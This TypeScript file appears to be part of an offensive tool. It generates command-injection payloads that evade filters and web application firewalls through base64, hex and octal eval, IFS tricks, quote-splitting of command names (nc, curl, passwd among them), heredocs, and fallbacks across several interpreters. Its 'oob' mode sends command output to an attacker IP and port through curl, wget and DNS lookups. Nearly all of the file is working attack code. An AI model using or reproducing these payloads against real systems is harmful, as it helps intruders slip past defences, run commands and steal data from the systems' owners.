export function applyQuantumBypass(
  cmd: string,
  mode: string,
  attackerIp = "127.0.0.1",
  attackerPort = "4444",
): string {
  if (!cmd) return "";
  const raw = String(cmd).trim();
  const b64 = Buffer.from(raw).toString("base64");
  const hex = Array.from(Buffer.from(raw)).map(b => `\\x${b.toString(16).padStart(2, "0")}`).join("");
  const oct = Array.from(Buffer.from(raw)).map(b => `\\${b.toString(8).padStart(3, "0")}`).join("");
  const rawHex = Buffer.from(raw).toString("hex");
  const TAB = "\t";
  const IFS = "${IFS}";

  switch (mode) {
    case "classic":
      return raw;

    case "blind":
      return (
        `_NX_T=$SECONDS; { ${raw}; } 2>&1; _NX_E=$?; ` +
        `sleep 7 2>/dev/null || ping -c 7 127.0.0.1 >/dev/null 2>&1 || ` +
        `python3 -c "import time;time.sleep(7)" 2>/dev/null || perl -e "sleep 7" 2>/dev/null; ` +
        `echo "[nx:blind|exit:$_NX_E|t:$((SECONDS-_NX_T))s]"`
      );

    case "oob": {
      const b64cmd = Buffer.from(raw).toString("base64");
      return (
        `_NX_OUT=$(${raw} 2>&1); ` +
        `_NX_B64=$(printf '%s' "$_NX_OUT" | base64 -w0 2>/dev/null || printf '%s' "$_NX_OUT" | base64 2>/dev/null); ` +
        `_NX_DN=$(printf '%s' "$_NX_OUT" | head -c 32 | tr -cd '[:alnum:]' | head -c 16); ` +
        `curl -sk -m 8 -X POST "http://${attackerIp}:${attackerPort}/x" ` +
          `--data-urlencode "d=$_NX_OUT" --data-urlencode "b=$_NX_B64" -H "X-NX: ${b64cmd}" >/dev/null 2>&1 & ` +
        `wget -qO/dev/null --timeout=8 "http://${attackerIp}:${attackerPort}/x?b=$_NX_B64" 2>/dev/null & ` +
        `curl -sk -m 5 "https://${attackerIp}:${attackerPort}/x?b=$_NX_B64" >/dev/null 2>&1 & ` +
        `nslookup "$_NX_DN.nx.${attackerIp}" >/dev/null 2>&1 & ` +
        `dig +short "$_NX_DN.oob.${attackerIp}" ANY 2>/dev/null & ` +
        `host "$_NX_DN.x.${attackerIp}" >/dev/null 2>&1 & ` +
        `printf '%s\\n' "$_NX_OUT"`
      );
    }

    case "quantum": {
      const b64env = Buffer.from(`${raw} 2>&1; env`).toString("base64");
      return (
        `{ {echo,${b64}}|{base64,-d}|bash; } 2>/dev/null || ` +
        `{ eval "$(printf '${hex}')"; } 2>/dev/null || ` +
        `{ eval "$(printf '${oct}')"; } 2>/dev/null || ` +
        `{ bash<<<$(echo${TAB}${b64}|base64${TAB}-d); } 2>/dev/null || ` +
        `{ python3 -c "import base64,os;os.system(base64.b64decode('${b64}').decode())" 2>/dev/null; } || ` +
        `{ perl -e "system(pack('H*','${rawHex}'))" 2>/dev/null; } || ` +
        `{ ruby -e "require 'base64';system(Base64.decode64('${b64}'))" 2>/dev/null; } || ` +
        `{ node -e "require('child_process').execSync(Buffer.from('${b64}','base64').toString(),{stdio:'inherit'})" 2>/dev/null; } || ` +
        `{ {echo,${b64env}}|{base64,-d}|bash; } 2>/dev/null`
      );
    }

    case "ifs": {
      const encoded = raw.replace(/ /g, IFS);
      const words = raw.split(/\s+/);
      const withTabs = words.join(TAB);
      const b64ifs = Buffer.from(raw).toString("base64");
      return (
        `${encoded} 2>/dev/null || ` +
        `{ IFS=,; set -- ${words.join(",")}; "$@"; } 2>/dev/null || ` +
        `{ ${withTabs}; } 2>/dev/null || ` +
        `{ bash${IFS}-c${IFS}${JSON.stringify(raw)}; } 2>/dev/null || ` +
        `eval${IFS}$(echo${IFS}${b64ifs}|base64${IFS}-d)`
      );
    }

    case "concat": {
      const broken = raw.replace(
        /\b(cat|id|whoami|ls|find|echo|curl|wget|bash|sh|python3|python|perl|ruby|nc|ncat|nmap|awk|sed|grep|tar|gzip|base64|openssl|php|java|gcc|hostname|uname|env|passwd|history)\b/g,
        (m) => { const mid = Math.max(1, Math.ceil(m.length / 2)); return `${m.slice(0, mid)}''${m.slice(mid)}`; }
      );
      const varBroken = raw.split("").map((c, i) => (/[a-zA-Z]/.test(c) && i % 4 === 0 ? `"${c}"` : c)).join("");
      const singleQ = raw.split("").map((c, i) => (/[a-z]/.test(c) && i % 3 === 1 ? `'${c}'` : c)).join("");
      return `${broken} 2>/dev/null || ${varBroken} 2>/dev/null || ${singleQ} 2>/dev/null`;
    }

    case "hex":
      return (
        `eval "$(printf '${hex}')" 2>/dev/null || ` +
        `{ _NX="$(printf '${hex}')"; eval "$_NX"; } 2>/dev/null || ` +
        `perl -e "system(pack('H*','${rawHex}'))" 2>/dev/null || ` +
        `python3 -c "import os;os.system(bytes.fromhex('${rawHex}').decode())" 2>/dev/null || ` +
        `echo ${rawHex}|xxd -r -p|bash 2>/dev/null || ` +
        `node -e "require('child_process').execSync(Buffer.from('${rawHex}','hex').toString(),{stdio:'inherit'})" 2>/dev/null`
      );

    case "b64loop": {
      const b64x2 = Buffer.from(b64).toString("base64");
      const b64x3 = Buffer.from(b64x2).toString("base64");
      return (
        `bash<<<$(echo${TAB}${b64}|base64${TAB}-d) 2>/dev/null || ` +
        `{ _a="${b64x2}"; _b=$(echo "$_a"|base64 -d|base64 -d); bash<<<$_b; } 2>/dev/null || ` +
        `{ _c="${b64x3}"; bash<<<$(echo "$_c"|base64 -d|base64 -d|base64 -d); } 2>/dev/null || ` +
        `{echo,${b64}}|{base64,-d}|{bash,} 2>/dev/null || ` +
        `perl -MMIME::Base64 -e "system(decode_base64('${b64}'))" 2>/dev/null || ` +
        `python3 -c "import base64,os;os.system(base64.b64decode('${b64}').decode())" 2>/dev/null`
      );
    }

    case "env": {
      const rnd = () => Math.floor(Math.random() * 90000) + 10000;
      const v1 = `_NXA${rnd()}`;
      const v2 = `_NXB${rnd()}`;
      const v3 = `_NXC${rnd()}`;
      const binPart = raw.split(/\s+/)[0] ?? "id";
      const argPart = raw.split(/\s+/).slice(1).join(" ");
      return (
        `${v1}=${JSON.stringify(raw)};bash -c "$${v1}" 2>/dev/null || ` +
        `{ ${v2}=${JSON.stringify(binPart)}; ${v1}=${JSON.stringify(argPart)}; "$${v2}" $${v1}; } 2>/dev/null || ` +
        `{ export ${v3}=${JSON.stringify(raw)}; eval "$${v3}"; } 2>/dev/null || ` +
        `{ declare ${v1}=${JSON.stringify(raw)}; eval "$${v1}"; } 2>/dev/null`
      );
    }

    case "heredoc": {
      const marker = `NX${Math.floor(Math.random() * 90000) + 10000}`;
      return `bash<<'${marker}'\n${raw}\n${marker}\nbash<<${marker}\n${raw}\n${marker}\nsh<<'NXEOF'\n${raw}\nNXEOF`;
    }

    default:
      return raw;
  }
}

export function buildWafBypass(payload: string): string {
  const b64 = Buffer.from(payload).toString("base64");
  const hex = Array.from(Buffer.from(payload)).map(b => `\\x${b.toString(16).padStart(2, "0")}`).join("");
  const rawHex = Buffer.from(payload).toString("hex");
  const oct = Array.from(Buffer.from(payload)).map(b => `\\${b.toString(8).padStart(3, "0")}`).join("");
  const TAB = "\t";
  const b64x2 = Buffer.from(b64).toString("base64");
  const mid = Math.ceil(payload.length / 2);
  const IFS = "${IFS}";
  const wordList = payload.split(" ");
  return [
    `{echo,${b64}}|{base64,-d}|bash`,
    `bash<<<$(echo${TAB}${b64}|base64${TAB}-d)`,
    `eval "$(printf '${hex}')"`,
    `eval "$(printf '${oct}')"`,
    `perl -e "system(pack('H*','${rawHex}'))"`,
    `python3 -c "import base64,os;os.system(base64.b64decode('${b64}').decode())"`,
    `node -e "require('child_process').execSync(Buffer.from('${b64}','base64').toString(),{stdio:'inherit'})"`,
    `{ _NX="$(printf '${hex}')"; eval "$_NX"; }`,
    `${payload.slice(0, mid)}''${payload.slice(mid)}`,
    `bash<<<$(echo "${b64x2}"|base64 -d|base64 -d)`,
    `{ IFS=,; set -- ${wordList.join(",")}; "$@"; }`,
    `${payload.replace(/ /g, IFS)}`,
    `echo ${rawHex}|xxd -r -p|bash`,
    `ruby -e "require 'base64';system(Base64.decode64('${b64}'))"`,
  ].join("\n");
}
